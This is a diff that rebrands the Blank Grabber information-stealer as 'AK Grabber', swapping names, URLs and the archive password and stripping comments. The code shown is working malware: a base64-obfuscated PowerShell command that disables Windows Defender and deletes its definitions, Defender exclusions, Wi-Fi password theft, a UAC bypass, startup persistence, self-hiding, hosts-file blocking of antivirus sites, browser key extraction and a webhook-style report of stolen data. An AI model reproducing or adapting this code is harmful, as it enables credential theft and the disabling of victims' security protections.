@@ -62,7 +62,7 @@ ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 
 logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled= True
-Logger = logging.getLogger("Blank Grabber")
+Logger = logging.getLogger("AK Grabber")
 Logger.setLevel(logging.INFO)
 
 if not Settings.Debug:
@@ -209,7 +209,7 @@ class Syscalls:
         return kernel32.GetLastError() != 183
     
     @staticmethod
-    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
+    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes:
 
         class DATA_BLOB(ctypes.Structure):
 
@@ -248,7 +248,7 @@ class Utility:
             return (__file__, False)
         
     @staticmethod
-    def TaskKill(*tasks: str) -> None: # Tries to kill given processes
+    def TaskKill(*tasks: str) -> None:
         tasks = list(map(lambda x: x.lower(), tasks))
         out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
         for i in out:
@@ -262,29 +262,29 @@ class Utility:
                 pass
     
     @staticmethod
-    def UACPrompt(path: str) -> bool: # Shows UAC Prompt
+    def UACPrompt(path: str) -> bool:
         return ctypes.windll.shell32.ShellExecuteW(None, "runas", path, " ".join(sys.argv), None, 1) == 42
 
     @staticmethod
-    def DisableDefender() -> None: # Tries to disable the defender
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+    def DisableDefender() -> None:
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore")
         subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
-    def ExcludeFromDefender(path: str = None) -> None: # Tries to exclude a file or folder from defender's scan
+    def ExcludeFromDefender(path: str = None) -> None:
         if path is None:
             path = Utility.GetSelf()[0]
         subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
-    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
+    def GetRandomString(length: int = 5, invisible: bool = False):
         if invisible:
             return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
         else:
             return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
     
     @staticmethod
-    def GetWifiPasswords() -> dict: # Gets wifi passwords stored in the system
+    def GetWifiPasswords() -> dict:
         profiles = list()
         passwords = dict()
 
@@ -305,7 +305,7 @@ class Utility:
         return passwords
 
     @staticmethod
-    def GetLnkTarget(path_to_lnk: str) -> str | None: # Finds the target of the given shortcut file
+    def GetLnkTarget(path_to_lnk: str) -> str | None:
         target = None
         if os.path.isfile(path_to_lnk):
             output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
@@ -320,7 +320,7 @@ class Utility:
         return target
     
     @staticmethod
-    def GetLnkFromStartMenu(app: str) -> list[str]: # Finds the shortcut to an app in the start menu
+    def GetLnkFromStartMenu(app: str) -> list[str]:
         shortcutPaths = []
         startMenuPaths = [
             os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
@@ -335,11 +335,11 @@ class Utility:
         return shortcutPaths
     
     @staticmethod
-    def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
+    def IsAdmin() -> bool:
         return ctypes.windll.shell32.IsUserAnAdmin() == 1
     
     @staticmethod
-    def UACbypass(method: int = 1) -> bool: # Tries to bypass UAC prompt and get administrator permissions (exe mode)
+    def UACbypass(method: int = 1) -> bool:
         if Utility.GetSelf()[1]:
         
             execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
@@ -373,12 +373,12 @@ class Utility:
             return True
     
     @staticmethod
-    def IsInStartup() -> bool: # Checks if the file is in startup
+    def IsInStartup() -> bool:
         path = os.path.dirname(Utility.GetSelf()[0])
         return os.path.basename(path).lower() == "startup"
     
     @staticmethod
-    def PutInStartup() -> str: # Puts the file in startup (exe mode)
+    def PutInStartup() -> str:
         STARTUPDIR = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
         file, isExecutable = Utility.GetSelf()
         if isExecutable:
@@ -389,7 +389,7 @@ class Utility:
             return out
     
     @staticmethod
-    def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
+    def IsConnectedToInternet() -> bool:
         http = PoolManager(cert_reqs="CERT_NONE")
         try:
             return http.request("GET", "https://gstatic.com/generate_204").status == 204
@@ -397,7 +397,7 @@ class Utility:
             return False
     
     @staticmethod
-    def DeleteSelf(): # Deletes the current file
+    def DeleteSelf():
         path, isExecutable = Utility.GetSelf()
         if isExecutable:
             subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
@@ -406,12 +406,12 @@ class Utility:
             os.remove(path)
     
     @staticmethod
-    def HideSelf() -> None: # Hides the current file
+    def HideSelf() -> None:
         path, _ = Utility.GetSelf()
         subprocess.Popen('attrib +h +s "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
     @staticmethod
-    def BlockSites() -> None: # Tries to block AV related sites using hosts file
+    def BlockSites() -> None:
         if Utility.IsAdmin():
             call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell= True, capture_output= True)
             if call.returncode != 0:
@@ -438,25 +438,25 @@ class Utility:
 
             newdata = "\n".join(newdata).replace("\n\n", "\n")
 
-            subprocess.run("attrib -r {}".format(hostfilepath), shell= True, capture_output= True) # Removes read-only attribute from hosts file
+            subprocess.run("attrib -r {}".format(hostfilepath), shell= True, capture_output= True)
             with open(hostfilepath, "w") as file:
                 file.write(newdata)
-            subprocess.run("attrib +r {}".format(hostfilepath), shell= True, capture_output= True) # Adds read-only attribute to hosts file
+            subprocess.run("attrib +r {}".format(hostfilepath), shell= True, capture_output= True)
     
 class Browsers:
 
     class Chromium:
 
-        BrowserPath: str = None # Stores the path to the browser's storage directory
-        EncryptionKey: bytes = None # Stores the encryption key that the browser uses to encrypt the data
+        BrowserPath: str = None
+        EncryptionKey: bytes = None
 
         def __init__(self, browserPath: str) -> None:
-            if not os.path.isdir(browserPath): # Checks if the browser's storage directory exists
+            if not os.path.isdir(browserPath):
                 raise NotADirectoryError("Browser path not found!")
 
             self.BrowserPath = browserPath
         
-        def GetEncryptionKey(self) -> bytes | None: # Gets the encryption key
+        def GetEncryptionKey(self) -> bytes | None:
             if self.EncryptionKey is not None:
                 return self.EncryptionKey
             
@@ -1577,7 +1577,7 @@ class BlankGrabber:
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
-                password = Settings.ArchivePassword or "blank123"
+                password = Settings.ArchivePassword or "AK"
                 process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
                     return "rar"
@@ -1683,9 +1683,9 @@ class BlankGrabber:
                     "content": "||@everyone||" if Settings.PingMe else "",
                     "embeds": [
                         {
-                            "title": "Blank Grabber",
+                            "title": "AK Grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/Blank-c/Blank-Grabber",
+                            "url": "https://github.com/unknownchesspawn/AK-grabber",
                             "color": 34303,
                             "footer": {
                                 "text": "Grabbed by AK Grabber | https://github.com/unknownchesspawn/AK-grabber"
